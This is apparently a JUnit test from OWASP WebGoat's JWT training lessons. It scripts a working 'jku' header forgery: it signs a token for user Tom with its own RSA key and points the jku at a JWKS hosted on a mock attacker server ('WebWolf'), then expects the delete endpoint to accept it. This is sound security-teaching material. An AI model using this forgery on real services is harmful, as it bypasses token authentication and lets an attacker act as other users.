package org.owasp.webgoat.lessons.jwt.claimmisuse;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.options;
import static io.jsonwebtoken.SignatureAlgorithm.RS256;
import static org.hamcrest.Matchers.is;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.github.tomakehurst.wiremock.WireMockServer;
import com.github.tomakehurst.wiremock.client.WireMock;
import io.jsonwebtoken.Jwts;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPublicKey;
import java.util.HashMap;
import java.util.Map;
import org.jose4j.jwk.JsonWebKeySet;
import org.jose4j.jwk.RsaJsonWebKey;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

class JWTHeaderJKUEndpointTest extends LessonTest {
  private KeyPair keyPair;
  private WireMockServer webwolfServer;
  private int port;

  @BeforeEach
  public void setup() throws Exception {
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();

    setupWebWolf();
    this.keyPair = generateRsaKey();
  }

  private void setupWebWolf() {
    this.webwolfServer = new WireMockServer(options().dynamicPort());
    webwolfServer.start();
    this.port = webwolfServer.port();
  }

  private KeyPair generateRsaKey() throws Exception {
    KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
    keyPairGenerator.initialize(2048);
    return keyPairGenerator.generateKeyPair();
  }

  @Test
  void solve() throws Exception {
    setupJsonWebKeySetInWebWolf();
    var token = createTokenAndSignIt();

    mockMvc
        .perform(MockMvcRequestBuilders.post("/JWT/jku/delete").param("token", token).content(""))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.lessonCompleted", is(true)));
  }

  @Test
  @DisplayName("When JWKS is not present in WebWolf then the call should fail")
  void shouldFailNotPresent() throws Exception {
    var token = createTokenAndSignIt();

    mockMvc
        .perform(MockMvcRequestBuilders.post("/JWT/jku/delete").param("token", token).content(""))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.lessonCompleted", is(false)));
  }

  private String createTokenAndSignIt() {
    Map<String, Object> claims = new HashMap<>();
    claims.put("username", "Tom");
    var token =
        Jwts.builder()
            .setHeaderParam("jku", "http://localhost:%d/files/jwks".formatted(port))
            .setClaims(claims)
            .signWith(RS256, this.keyPair.getPrivate())
            .compact();
    return token;
  }

  private void setupJsonWebKeySetInWebWolf() {
    var jwks = new JsonWebKeySet(new RsaJsonWebKey((RSAPublicKey) keyPair.getPublic()));
    webwolfServer.stubFor(
        WireMock.get(WireMock.urlMatching("/files/jwks"))
            .willReturn(aResponse().withStatus(200).withBody(jwks.toJson())));
  }
}
